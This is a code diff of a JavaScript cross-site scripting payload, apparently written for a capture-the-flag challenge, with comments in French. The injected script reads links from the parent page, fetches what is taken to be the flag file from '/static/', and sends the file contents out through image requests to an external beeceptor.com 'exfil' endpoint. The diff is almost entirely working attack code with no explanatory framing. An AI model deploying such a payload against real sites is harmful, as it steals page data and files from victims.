@@ -5,21 +5,22 @@
       (async () => {
         try {
           const links = [...parent.document.querySelectorAll('a')];
-          const mapped = links.map(x => x.outerHTML).join('--');
-          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=links_' + encodeURIComponent(mapped.slice(0, 500));
+          
+          if (!links.length) {
+            new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=no_links';
+            return;
+          }
 
-          const a = links.find(x => 
-            /file-.*\\.txt$/.test(x.id || '') ||
-            /file-.*\\.txt$/.test(x.href || '') ||
-            /flag\\.txt$/.test(x.textContent || '')
-          );
+          // Prendre directement le dernier lien ajouté (flag)
+          const a = links[links.length - 1];
 
           if (!a) {
             new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
             return;
           }
 
-          const res = await fetch(a.href);
+          const fileId = a.dataset.id; // récupérer le bon id
+          const res = await fetch('/static/' + fileId + '.txt'); // le fichier est probablement rendu ici
           const txt = await res.text();
 
           new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=' + encodeURIComponent(txt);
@@ -28,7 +29,7 @@
         }
       })();
     <\/script>`;
-  
+
   const blob = new Blob([epic], { type: 'text/html' });
 
   window.postMessage({
